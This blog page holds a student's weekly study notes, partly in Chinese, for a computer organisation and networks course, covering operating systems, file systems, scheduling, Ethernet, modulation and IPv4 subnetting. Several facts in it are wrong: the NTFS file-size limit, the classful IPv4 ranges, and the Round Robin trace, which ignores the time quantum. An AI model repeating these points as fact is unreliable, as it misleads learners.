    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>笔记自用，想到啥写啥，希望顺利毕业 hhh </p><h1 id="FIT9137-计组和网络"><a href="#FIT9137-计组和网络" class="headerlink" title="FIT9137 计组和网络"></a>FIT9137 计组和网络</h1><h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><p>开学前老师会让大伙安装虚拟机和环境，环境是个轻量级的<code>Ubuntu</code>，叫作 <code>Lubuntu</code><br><a href="https://manual.lubuntu.me/stable/index.html">官方手册</a> 可以推荐看看，大部分问题都可以解决</p><p>安装好的网络适配环境，VMware 可能会出现NAT配置网络失败，VirtualBox 自适配好一些(包括屏幕分辨率什么的)，网络解决办法是先点击左下音量左边的网络配置，然后选择<code>Auto Ethernet</code>, 然后用浏览器测试网站是否连接成功<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302261356909.jpg" data-fancybox="group" data-caption="week0_1" class="fancybox"><img alt="week0_1" title="week0_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302261356909.jpg" class="lazyload"></a></p><p>推荐了两本书，</p><ul><li><p><strong>Data Communications &amp; Networks</strong><br>  Forouzan, Behrouz A.<br>  5th Edition<br>  McGraw-Hill, 2013</p></li><li><p><strong>Modern Operating Systems</strong><br>  Tanenbaum, Andrew<br>  4th Edition<br>  Pearson, 2014</p></li></ul><h2 id="Homework-Q-amp-A"><a href="#Homework-Q-amp-A" class="headerlink" title="Homework Q&amp;A"></a>Homework Q&amp;A</h2><p><strong>Modern computer systems are interrupt driven.</strong>  Do some research on why interrupts are important and write in your own words why YOU need to know and understand interrupts (ie. why are they important to your studies?). </p><ul><li>An interrupt is a signal emitted by a device attached to a computer or from a program within the computer. It requires the operating system (OS) to stop and figure out what to do next. <a href="https://www.techtarget.com/whatis/definition/interrupt">ref-link</a></li><li>By learning interrupt principle, I can better understand the principle of computer operation and better understand the theoretical knowledge of computer architecture.</li></ul><p>Write your own definitions and explanations of the terms <strong>“soft interrupt”</strong> and <strong>“hard interrupt”</strong> and how they work to help remember them in the future.</p><ul><li><strong>Soft interrupt</strong>: the interrupt occurred by software programs or systems to stop program execution and pass execution over to the INT handler.</li><li><strong>hard interrupt</strong>: the interrupt occurred from an external device like some I&#x2F;O devices, it is a way to avoid wasting the processor’s valuable time in polling loops and waiting for external events.  <a href="https://www.geeksforgeeks.org/difference-between-hardware-interrupt-and-software-interrupt/">ref-link</a></li></ul><h2 id="Selection"><a href="#Selection" class="headerlink" title="Selection"></a>Selection</h2><p>based on <strong>SERVER-BASED ARCHITECTURE</strong></p><table><thead><tr><th>Client</th><th>Server</th></tr></thead><tbody><tr><td>NULL</td><td>Presentation logic</td></tr><tr><td></td><td>Application&#x2F;business logic</td></tr><tr><td></td><td>Data access logic</td></tr><tr><td></td><td>Data storage</td></tr></tbody></table><p><font color="blue">The client is a ‘dumb terminal’. This architecture can be problematic because the server can cause bottlenecks.</font> &#x2F;&#x2F; bottleneck: 瓶颈，阻碍</p><p>base on <strong>CLIENT-BASED ARCHITECTURE</strong></p><table><thead><tr><th>Client</th><th>Server</th></tr></thead><tbody><tr><td>Presentation logic</td><td>Data storage</td></tr><tr><td>Application&#x2F;business logic</td><td></td></tr><tr><td>Data access logic</td><td></td></tr></tbody></table><p><font color="blue">All logic is performed by the client. The server stores the data. This architecture can be problematic because all data needs to travel between server and client.</font></p><p>base on <strong>CLIENT-SERVER ARCHITECTURE</strong></p><table><thead><tr><th>Client</th><th>Server</th></tr></thead><tbody><tr><td>Presentation logic</td><td>Data access logic</td></tr><tr><td>Application&#x2F;business logic</td><td>Data storage</td></tr></tbody></table><p>base on <strong>THIN-CLIENT ARCHITECTURE</strong></p><table><thead><tr><th>Client</th><th>Server</th></tr></thead><tbody><tr><td>Presentation logic</td><td>Application&#x2F;business logic</td></tr><tr><td></td><td>Data access logic</td></tr><tr><td></td><td>Data storage</td></tr></tbody></table><hr><h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="pre-class"><a href="#pre-class" class="headerlink" title="pre-class"></a>pre-class</h2><h2 id="Selection-1"><a href="#Selection-1" class="headerlink" title="Selection"></a>Selection</h2><p><strong>Which of the following statements is true regarding the order of the phases of a cycle in a conventional processor?</strong></p><p>a. The processor first executes the instruction (Execute phase), then fetches the required data into its registers (Fetch phase), and finally decodes the results (Decode phase)</p><p>b. The processor first decodes the instruction (Decode phase), then fetches the required data into its registers (Fetch phase), and finally executes (Execute phase)</p><p>c. The processor first fetches the instruction and data into its registers (Fetch phase), then decodes the instruction (Decode phase), and finally executes the instruction on data (Execute phase).</p><p>d. The processor first fetches the instruction (Fetch phase), then executes the instruction (Execute phase), and finally decodes the results (Decode phase)</p><p><strong>Which of the following statements is false regarding the process management function of Operating System (OS)?</strong></p><p>a. The process management function of OS loads the entire program into main memory when creating the process.</p><p>b. The process management function of OS controls the execution of the processes and acts on exceptional conditions arising during execution.</p><p>c. The process management function of OS creates and destroys processes.</p><p>d. The process management function of OS allocates resources among processes.</p><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p><strong>Write three things that a kernel does that makes it important.</strong><br><code>Memory management</code>； <code>Process management</code>；<code>Operation System</code></p><p><strong>FAT32</strong> (File Allocation Table 32) is a file system that is commonly used on Windows-based computers.</p><p><strong>NTFS</strong> (New Technology File System) is a file system that was introduced with Windows NT in 1993 and is still widely used on modern Windows-based computers. It is a more advanced file system than the older FAT16 and FAT32 file systems and offers several improvements in terms of performance, security, and reliability.</p><table><thead><tr><th>FAT32</th><th>NTFS</th></tr></thead><tbody><tr><td>Maximum 4GB file size</td><td>Maximum 16GB file size</td></tr><tr><td>Ps4 can read</td><td>MacOS can read but not write</td></tr><tr><td>Simple structure</td><td>Complex structure</td></tr><tr><td>Maximum of 83 characters in a file name</td><td>Includes file encryption</td></tr><tr><td></td><td>Includes file compression</td></tr></tbody></table><h2 id="Do-some-research-on-hard-link-and-soft-links"><a href="#Do-some-research-on-hard-link-and-soft-links" class="headerlink" title="Do some research on hard link and soft links."></a>Do some research on hard link and soft links.</h2><p>Both soft links and hard links are methods of linking files or directories, </p><ol><li><p>They are stored in different locations, soft link is a file that contains a pathname pointing to the target file. And hard link is a direct link pointing to the target file.<br>存储位置：软链接和硬链接都是指向另一个文件或目录的链接，但是它们的存储位置不同。软链接是一个特殊的文件，其中包含指向目标文件的路径名。而硬链接是一个指向目标文件的直接链接，它们实际上是同一个文件，只是具有不同的文件名和路径。</p></li><li><p>Soft links can pass through file systems, but hard links can only be created within the same file system.<br>跨文件系统：软链接可以跨越文件系统，也就是说可以链接到不同的磁盘或分区上的文件。而硬链接只能在同一个文件系统内创建，因为它们依赖于文件系统中的inode编号，而不同的文件系统可能会有不同的inode编号。</p></li><li><p>When the original file is deleted, soft links and hard links are handled differently. The soft link just points to the path name of the original file. When the original file is deleted, the soft link will point to a file that does not exist. The hard link is an alias of the original file. Even if the original file is deleted, the hard link can still access the contents of the original file.<br>原文件删除：当原文件被删除时，软链接和硬链接的行为也不同。软链接只是指向原文件的路径名，当原文件被删除时，软链接将指向一个不存在的文件。而硬链接则是原文件的一个别名，即使原文件被删除，硬链接仍然可以访问原文件的内容，因为它们实际上是同一个文件。</p></li><li><p>Soft link is a special file so it can be read and edited like a normal file. The hard link is just another filename pointing to the original file, so it cannot be read or edited like a soft link.<br>可读性：软链接是一个特殊的文件，所以它可以像普通文件一样被读取和编辑。而硬链接只是指向原文件的另一个文件名，所以它不能像软链接一样被读取或编辑。</p></li></ol><p>今天上课教了linux操作命令，也很水，Student Connect 旁边的布朗尼好吃</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303060921733.JPG" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303060921733.JPG" class="lazyload"></a></p><p>水的很的大课，一周又结束了，要抽时间去写点research笔记了</p><hr><h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="selection"><a href="#selection" class="headerlink" title="selection"></a>selection</h2><p><strong>Which of the following statements is true if the octal access rights of a file is 751?</strong></p><ol><li><p>The others can only write in the file.</p></li><li><p><font color="blue">The members of the group can read and execute.</font></p></li><li><p>The owner of the file can only write and execute.</p></li><li><p>The members of the group can read and write in the file.</p></li></ol><p><code>751</code> &#x3D;&#x3D; <code>-rwxr-x--x</code></p><p>The owner of the file can read (4) + write (2) + execute (1) &#x3D; 7.<br>The members of the group can execute (1) + read (4) &#x3D; 5.<br>The others can execute (1) &#x3D; 1.</p><p><strong>Which of the following statements is False regarding the paging-based memory management technique?</strong></p><ol><li><p>Main memory is divided into many equal-sized frames.</p></li><li><p>Each process (a program in execution) is divided into frame-size pages.</p></li><li><p><font color="red">When a process is brought in, all of its pages are loaded into available frames.</font></p></li><li><p>Page size and Frame size are equal.</p></li></ol><p>When a process is brought in, all of its pages are loaded into available frames is a false statement regarding the paging-based memory management technique.</p><p>When a process is brought into memory, <strong>only some of its pages</strong> are loaded into available frames, not all of its pages. The remaining pages are loaded into frames as they are referenced during the process execution, using a technique called demand paging.</p><h2 id="Examples-of-non-pre-emptive-scheduling-algorithms"><a href="#Examples-of-non-pre-emptive-scheduling-algorithms" class="headerlink" title="Examples of non-pre-emptive scheduling algorithms"></a>Examples of non-pre-emptive scheduling algorithms</h2><p>First-in first-out, Shortest job first, Priority scheduling</p><h2 id="Mutual-Exclusion-in-OS"><a href="#Mutual-Exclusion-in-OS" class="headerlink" title="Mutual Exclusion in OS:"></a>Mutual Exclusion in OS:</h2><p>Ensures non-shareable resources (e.g. printers) are accessed by only one process at a time.</p><p>Mutual exclusion is a mechanism used by operating systems to ensure that only one process at a time can access a particular resource. Non-shareable resources, such as printers, can be accessed by only one process at a time, and therefore require mutual exclusion to ensure that multiple</p><h2 id="Deadlock-in-OS"><a href="#Deadlock-in-OS" class="headerlink" title="Deadlock in OS"></a>Deadlock in OS</h2><p>When two or more processes want to use a shareable resource held by each other</p><p><code>Single-processing</code>: one process in memory at any time. It is easy to implement - it either fits or it doesn’t.<br><code>Multi-processing</code>: multiple processes in memory at the same time.<br><code>Swapping</code> allows computer rapidly “swap” its CPU between the process by loading and unloading them into&#x2F;from memory.<br><code>Process Table</code> contains entries called Process Control Blocks. It contains data such as process state and process ID, program counter, memory address of the Page Table, resources in-used&#x2F;needed, etc.<br><code>Cache memory</code> is small and stores only active pages. It is searched first for page number. If not found, search then goes to the page table in conventional memory.<br><code>Hit ratio</code> &#x3D; percentage of times a page is found in the page.<br>If a required page is not in memory then an interrupt called <code>Page default</code> results. This causes the required page to be loaded from secondary memory into main memory, and the page table updated.<br>Some common page replacement algorithms are: <code>LRU/LFU and F.I.F.O</code><br>When a program may spend a lot of time performing a loop, or assessing consecutive elements of a list is called <code>Locality</code><br><code>Working Set</code> is a minimum number of pages that meets the locality requirement.</p><h2 id="Paging-vs-Segmentation"><a href="#Paging-vs-Segmentation" class="headerlink" title="Paging vs Segmentation"></a>Paging vs Segmentation</h2><p>Paging and segmentation are two memory management techniques used by operating systems to manage physical memory.</p><p>Paging divides physical memory into fixed-sized blocks called pages and logical memory into fixed-sized blocks called page frames. When a process needs to access a page, the operating system maps the page to a page frame and loads it into memory. Paging allows for efficient use of physical memory and provides protection by allocating memory in small, fixed-sized blocks. However, it can lead to fragmentation of physical memory and may require additional overhead for managing page tables.</p><p>Segmentation, on the other hand, divides logical memory into variable-sized segments, where each segment represents a logical unit of a process. Each segment can be of different size, and segments can be dynamically allocated and deallocated as needed. The operating system maintains a segment table that maps logical addresses to physical addresses. Segmentation provides better memory utilization as compared to paging and eliminates fragmentation, but it can lead to external fragmentation if segments are frequently created and destroyed.</p><p>In summary, both paging and segmentation have their advantages and disadvantages, and their suitability depends on the specific requirements of an operating system and the applications it needs to run. Some operating systems use a combination of both techniques, known as segmented paging, to combine the advantages of both techniques.</p><h2 id="Workshop-Activity1-Round-Robin-Scheduling"><a href="#Workshop-Activity1-Round-Robin-Scheduling" class="headerlink" title="Workshop Activity1 Round Robin Scheduling"></a>Workshop Activity1 Round Robin Scheduling</h2><p>Suppose the time quantum of a Round Robin scheduler is 50 milliseconds. </p><table><thead><tr><th>Label</th><th>Start time</th><th>Processing time</th></tr></thead><tbody><tr><td>Process 1</td><td>0</td><td>95ms</td></tr><tr><td>Process 4</td><td>15ms</td><td>65ms</td></tr><tr><td>Process 5</td><td>75ms</td><td>35ms</td></tr><tr><td>Process 3</td><td>175ms</td><td>145ms</td></tr><tr><td>Process 2</td><td>201ms</td><td>10ms</td></tr></tbody></table><p>Note: If a process’ remaining time is less than the quantum when it finishes the OS dispatches the process in front of the queue.</p><p>a) Which process starts first?</p><ul><li><code>Process 1</code> Start time is 0</li></ul><p>b) Which process finishes last? When does it finish?</p><ul><li><code>Process 3</code> which finishes at 320ms (175ms start time + 145ms processing time).</li></ul><p>c) Which process finishes second last?</p><ul><li>The process that finishes second last is <code>Process 2</code>, which finishes at 211ms (201ms start time + 10ms processing time).</li></ul><p>d) Show all the steps of the Round Robin algorithm using a queue.</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Queue: []</span><br><span class="line"></span><br><span class="line">0ms: Process 1 arrives</span><br><span class="line">Queue: [1]</span><br><span class="line"></span><br><span class="line">15ms: Process 4 arrives</span><br><span class="line">Queue: [1, 4]</span><br><span class="line"></span><br><span class="line">75ms: Process 5 arrives</span><br><span class="line">Queue: [1, 4, 5]</span><br><span class="line"></span><br><span class="line">95ms: Process 1 completes, Process 4 starts</span><br><span class="line">Queue: [4, 5]</span><br><span class="line"></span><br><span class="line">160ms: Process 4 completes, Process 5 starts</span><br><span class="line">Queue: [5]</span><br><span class="line"></span><br><span class="line">175ms: Process 3 arrives</span><br><span class="line">Queue: [5, 3]</span><br><span class="line"></span><br><span class="line">195ms: Process 5 completes, Process 3 starts</span><br><span class="line">Queue: [3]</span><br><span class="line"></span><br><span class="line">201ms: Process 2 arrives</span><br><span class="line">Queue: [3, 2]</span><br><span class="line"></span><br><span class="line">245ms: Process 2 starts</span><br><span class="line">Queue: [2, 3]</span><br><span class="line"></span><br><span class="line">255ms : Process 2 completes, Process 3 continues</span><br><span class="line">Queue: [3]</span><br><span class="line"></span><br><span class="line">350ms: Process 3 completes</span><br><span class="line">Queue: []</span><br></pre></td></tr></table></figure></div><h2 id="ACTIVITY-B-Special-Files-Links"><a href="#ACTIVITY-B-Special-Files-Links" class="headerlink" title="ACTIVITY B: Special Files (Links)"></a>ACTIVITY B: Special Files (Links)</h2><p>做软硬连接</p><hr><h1 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h1><h2 id="TCP-x2F-IP"><a href="#TCP-x2F-IP" class="headerlink" title="TCP&#x2F;IP"></a>TCP&#x2F;IP</h2><p>普通的高低电平（甚至没讲曼切斯特）</p><p>FireFox Wireshark 抓包 没意思 </p><h2 id="Activity-1"><a href="#Activity-1" class="headerlink" title="Activity 1"></a>Activity 1</h2><ol><li>Open Firefox in the VM and visit the Monash University website by entering<br><code>www.monash.edu</code> in the address bar.</li></ol><ul><li><p>What kind of addressing you used to visit Monash website?<br>Uniform Resource Locator (URL)</p></li><li><p>The address is used in which layer in the TCP&#x2F;IP protocol stack?<br>Application layer</p></li></ul><ol start="2"><li>Enter the following command in the VM terminal:<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.monash.edu</span><br></pre></td></tr></table></figure></div><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303241203457.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303241203457.jpg" class="lazyload"></a></li></ol><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man nslookup</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303241205018.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303241205018.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure></div><hr><h1 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h1><h2 id="Applied"><a href="#Applied" class="headerlink" title="Applied"></a>Applied</h2><h2 id="Activity-1-1"><a href="#Activity-1-1" class="headerlink" title="Activity 1.1"></a>Activity 1.1</h2><p>install a WLAN sniffing tools <a href="http://www.netspotapp.com/">NetSpot</a></p><h2 id="Activity-1-2"><a href="#Activity-1-2" class="headerlink" title="Activity 1.2"></a>Activity 1.2</h2><ol><li>Create a list of available wireless access points and observe the characteristics such as SSID, MAC Address, Signal Strength, Signal to Noise Ratio (SNR), Frequency Band, Mode, Security, etc.</li></ol><table><thead><tr><th>SSID</th><th>MAC Address</th><th>Signal Strength</th><th>Signal to Noise Ratio</th><th>Frequency Band</th><th>Mode</th><th>Security</th></tr></thead><tbody><tr><td>Mxxx Guest Wi-Fi</td><td>F4:DB:E6:0C:6A:AE</td><td>-49~-91</td><td></td><td>5 or 2.4</td><td>ac</td><td>Open</td></tr></tbody></table><p>AC refers to Wi-Fi 5 (802.11ac)<br>AX refers to Wi-Fi 6 (802.11ax).<br>n refers to 802.11n (Wireless-N operates on both the 2.4GHz and 5GHz)</p><h2 id="Workshop"><a href="#Workshop" class="headerlink" title="Workshop"></a>Workshop</h2><h2 id="activity-A-Media-Access-Control"><a href="#activity-A-Media-Access-Control" class="headerlink" title="activity A: Media Access Control"></a>activity A: Media Access Control</h2><ol><li>Explain the three components of CSMA&#x2F;CD Media Access Control (MAC) protocols in Ethernet networks: CS, MA, and CD<br>CSMA&#x2F;CD stands for Carrier Sense Multiple Access with Collision Detection, which is a media access control protocol used in Ethernet networks. It has three main components:</li></ol><ul><li><p>CS (Carrier Sense): Before sending data, a device checks if the network is idle. If it is, the device can transmit its data. If the network is busy, the device waits until it is idle.</p></li><li><p>MA (Multiple Access): Ethernet networks allow multiple devices to share the same network medium. When multiple devices attempt to transmit data at the same time, collisions can occur.</p></li><li><p>CD (Collision Detection): If two devices start transmitting data at the same time and their signals collide, both devices detect the collision and stop transmitting. They then wait a random amount of time before attempting to transmit again.</p></li></ul><ol start="2"><li><p>Explain the difference between the Shared Ethernet with Switched Ethernet.</p></li><li><p>Explain the media access control mechanism of IEEE 802.11 wireless network,CSMA&#x2F;CA.</p></li></ol><h2 id="activity-b"><a href="#activity-b" class="headerlink" title="activity b"></a>activity b</h2><hr><h1 id="week6"><a href="#week6" class="headerlink" title="week6"></a>week6</h1><h2 id="Applied-1"><a href="#Applied-1" class="headerlink" title="Applied"></a>Applied</h2><h2 id="FM-Frequency-Modulation-x2F-encoding"><a href="#FM-Frequency-Modulation-x2F-encoding" class="headerlink" title="FM Frequency Modulation&#x2F;encoding"></a>FM Frequency Modulation&#x2F;encoding</h2><p>An encoding table is a table that for each symbol shows the parameters of the modulation signal.</p><table><thead><tr><th>Symbol</th><th>Frequency</th></tr></thead><tbody><tr><td>0</td><td>1hz</td></tr><tr><td>1</td><td>2hz</td></tr></tbody></table><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202304030832973.jpg" data-fancybox="group" data-caption="1bit FM" class="fancybox"><img alt="1bit FM" title="1bit FM" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202304030832973.jpg" class="lazyload"></a></p><ul><li>for the first symbol: 0 we will have the signal 𝑦 &#x3D; 𝐴 ⋅ 𝑠𝑖𝑛(2𝜋𝑓1𝑥 + 𝜙)</li><li>for the second symbol: 1 we will have the signal 𝑦 &#x3D; 𝐴 ⋅ 𝑠𝑖𝑛(2𝜋𝑓2𝑥 + 𝜙)</li><li>for the third symbol: 0 we will have the signal 𝑦 &#x3D; 𝐴 ⋅ 𝑠𝑖𝑛(2𝜋𝑓1𝑥 + 𝜙)</li></ul><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202304030838973.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202304030838973.jpg" class="lazyload"></a></p><h2 id="PM-Phase-Modulation-x2F-encoding"><a href="#PM-Phase-Modulation-x2F-encoding" class="headerlink" title="PM Phase Modulation&#x2F;encoding"></a>PM Phase Modulation&#x2F;encoding</h2><table><thead><tr><th>Symbol</th><th>Frequency</th></tr></thead><tbody><tr><td>0</td><td>45&amp;deg; &#x3D; $\frac{\pi}{4}$</td></tr><tr><td>1</td><td>225&amp;deg; &#x3D; $\frac{5\pi}{4}$</td></tr></tbody></table><h2 id="AM-Amplitude-Modulation-x2F-encoding"><a href="#AM-Amplitude-Modulation-x2F-encoding" class="headerlink" title="AM Amplitude Modulation&#x2F;encoding"></a>AM Amplitude Modulation&#x2F;encoding</h2><h2 id="Amplitude-Phase-Modulation"><a href="#Amplitude-Phase-Modulation" class="headerlink" title="Amplitude + Phase Modulation"></a>Amplitude + Phase Modulation</h2><hr><h1 id="week7"><a href="#week7" class="headerlink" title="week7"></a>week7</h1><h2 id="applied-网络层-IP"><a href="#applied-网络层-IP" class="headerlink" title="applied 网络层 IP"></a>applied 网络层 IP</h2><p>IP 分片, <a href="https://datatracker.ietf.org/doc/html/rfc791#page-10">封包</a><br>a) <strong>What is the purpose of an IP address?</strong><br>An IP (Internet Protocol) address is a <code>unique numerical identifier</code> assigned to each device connected to the internet, such as a computer, smartphone, or router. Its purpose is to provide a way for devices to communicate with each other over the internet.</p><p>b) <strong>What is the size of Source and Destination Address fields?</strong><br><code>IPv4</code>, the Source and Destination Address fields are each 32 bits<br><code>IPv6</code>, 128bits</p><p>c) <strong>What is the total number of possible IPv4 Addresses?</strong><br>$2^{32}$</p><p>d) If the binary representation of an IP address is as follows what is the dotted<br>decimal notation of the address?<br>11001010000010010101111110111100<br>↓<br>11001010 | 00001001 | 01011111 | 10111100<br>202.9.95.188.</p><h2 id="Answer-the-following-questions"><a href="#Answer-the-following-questions" class="headerlink" title="Answer the following questions"></a>Answer the following questions</h2><p>regarding IPv4 addresses<br>a) <strong>Explain Classful addressing.</strong><br>Classful addressing is an addressing scheme used in IPv4 where the address space is divided into five classes: A, B, C, D, and E. Each class has a fixed range of address space allocated to it and is identified by the value of the first few bits of the address. Class A addresses have the first bit set to 0, Class B addresses have the first two bits set to 10, and Class C addresses have the first three bits set to 110. Classes D and E are reserved for special purposes.</p><table><thead><tr><th>IPv4</th><th>Address</th><th>Port start</th></tr></thead><tbody><tr><td>Class A</td><td>0xxxxxxx</td><td>0~127</td></tr><tr><td>Class B</td><td>10xxxxxx</td><td>128~171</td></tr><tr><td>Class C</td><td>110xxxxx</td><td>172~203</td></tr><tr><td>Class D</td><td>1110xxxx</td><td>204~219</td></tr><tr><td>Class E</td><td>11110xxx</td><td>220~227</td></tr></tbody></table><p>b) <strong>Explain Classless addressing.</strong><br>Classless addressing is an addressing scheme used in IPv4 where the address space is not divided into fixed classes. Instead, the address space is divided into variable-length prefixes, which can be used to assign addresses to networks of different sizes. Classless addressing is also referred to as Classless Inter-Domain Routing (CIDR)</p><p>无类别寻址是 IPv4 中使用的一种寻址方案，其中地址空间未划分为固定类别。 相反，地址空间被划分为可变长度的前缀，可用于将地址分配给不同规模的网络。 无类寻址也称为无类域间路由 (CIDR)。</p><p>c) <strong>Why Classless addressing is used instead of Classful addressing?</strong></p><p>Classless addressing is used instead of Classful addressing because it allows for more efficient use of the available address space. In Classful addressing, address space is allocated in fixed blocks, which can lead to wastage of addresses if a network does not need the full block of addresses. Classless addressing, on the other hand, allows for the allocation of only the required number of addresses, reducing address wastage and increasing the efficiency of address usage.</p><p>使用无类寻址而不是有类寻址，因为它允许更有效地使用可用地址空间。 在分类寻址中，地址空间以固定块的形式分配，如果网络不需要完整的地址块，这会导致地址浪费。 另一方面，无类寻址允许只分配所需数量的地址，减少地址浪费并提高地址使用效率。</p><p>d) How is network and host part of an IP address identified in Classless addressing?</p><p>In Classless addressing, the network and host part of an IP address are identified by a subnet mask. The subnet mask specifies the number of bits used to identify the network portion of the address and the number of bits used to identify the host portion of the address. For example, a subnet mask of 255.255.255.0 (in dotted decimal notation) indicates that the first 24 bits of the IP address represent the network portion and the last 8 bits represent the host portion. The subnet mask is used to determine the network address and the host address of an IP address.</p><p>在无类寻址中，IP 地址的网络和主机部分由子网掩码标识。 子网掩码指定用于标识地址网络部分的位数和用于标识地址主机部分的位数。 例如，子网掩码 255.255.255.0（点分十进制表示法）表示 IP 地址的前 24 位代表网络部分，后 8 位代表主机部分。 子网掩码用于确定IP地址的网络地址和主机地址。</p><h2 id="IP-mask"><a href="#IP-mask" class="headerlink" title="IP mask"></a>IP mask</h2><p>For each of the following Classless IPv4 addresses and their corresponding subnet masks, find out the network address, <code>the subnet’s broadcast address</code>, and the number of usable addresses in that subnet.</p><p>a) <strong>IP address: 192.168.13.23, netmask: 255.255.0.0</strong><br>netmask: 255.255.0.0 -&gt;  first 16 bits of the IP address represent the network portion, and the last 16 bits represent the host portion.</p><p>Network address: 192.168.0.0</p><p>Broadcast address: 192.168.255.255<br><code>广播地址全为1</code> 0 -&gt; 1</p><p>Number of usable addresses: 65,534<br>2^(number of bits in host portion of subnet mask) - 2</p><p>b) <strong>IP address: 130.194.77.37 netmask: 0xfffffe00</strong><br>ff,ff,fe,00 -&gt; 255.255.254.0<br>first 23 bits -&gt; network portion<br>last 9 bits -&gt; host portion (0.0.1.255)</p><p>Network address: 130.194.76.0<br><code>76.0</code> -&gt; <code>0100 1100, 0000 0000</code><br>Broadcast address: 130.194.77.255</p><p>Number of usable addresses: 510<br>$2^9$-2</p><p>c) <strong>IP address 130.194.66.77 netmask: &#x2F;26</strong><br>The <code>netmask /26</code> indicates that the first 26 bits are the network bits and the remaining 6 bits are the host bits.</p><p>IP address:    130.194.66.77<br>Subnet mask:   &#x2F;26<br>Network addr:  130.194.66.64<br>64 &#x3D; 01<font color="blue">00 0000</font></p><p>Broadcast addr:130.194.66.127<br>127 &#x3D; 01<font color="red">11 1111</font></p><p>Number of usable addresses: $2^6$-2 &#x3D; 62</p><h2 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h2><ul><li><p>Why was the restriction to 3 classes (A,B,C) a problem for the network?<br>For many companies class C is too small but class B is to large<br>Class A networks were too big to be different</p></li><li><p>In Network layer Addressing, Internet Protocol Version (IPv4) addresses, Classful addressing is replaced with:<br><code>Classless addressing</code></p></li><li><p>In Address Resolution Protocol (ARP), the request message is encapsulated as a:<br><code>Data Link frame</code></p></li><li><p>ARP request is sent as a broadcast message, the reply is:<br><code>Unicast message</code></p></li><li><p>Mapping a name to an address or an address to a name is called:<br><code>Name-address Resolution</code></p></li></ul><h2 id="ACTIVITY-A-Address-Resolution"><a href="#ACTIVITY-A-Address-Resolution" class="headerlink" title="ACTIVITY A: Address Resolution"></a>ACTIVITY A: Address Resolution</h2><ol><li>Explain how application layer addresses (e.g. <a href="http://www.monash.edu/">www.monash.edu</a> or <a href="mailto:&#106;&#115;&#x6d;&#x69;&#116;&#104;&#x40;&#x66;&#111;&#x6f;&#x2e;&#x63;&#111;&#x6d;">&#106;&#115;&#x6d;&#x69;&#116;&#104;&#x40;&#x66;&#111;&#x6f;&#x2e;&#x63;&#111;&#x6d;</a>) are resolved to IP addresses and why is this necessary.</li></ol><p>URL -&gt; DNS analysis route get the IP request </p><ol start="2"><li>Explain how IP addresses are resolved to MAC addresses (in Ethernet) and why is this necessary</li></ol><hr><h1 id="week8"><a href="#week8" class="headerlink" title="week8"></a>week8</h1><h2 id="Types-of-decentralized-Routing"><a href="#Types-of-decentralized-Routing" class="headerlink" title="Types of decentralized Routing"></a>Types of decentralized Routing</h2><ol><li><p>Distance-vector routing 距离向量路由<br>node calculates the <code>shortest path</code> to other nodes in the network based on the distance metric such as hop count, delay, or 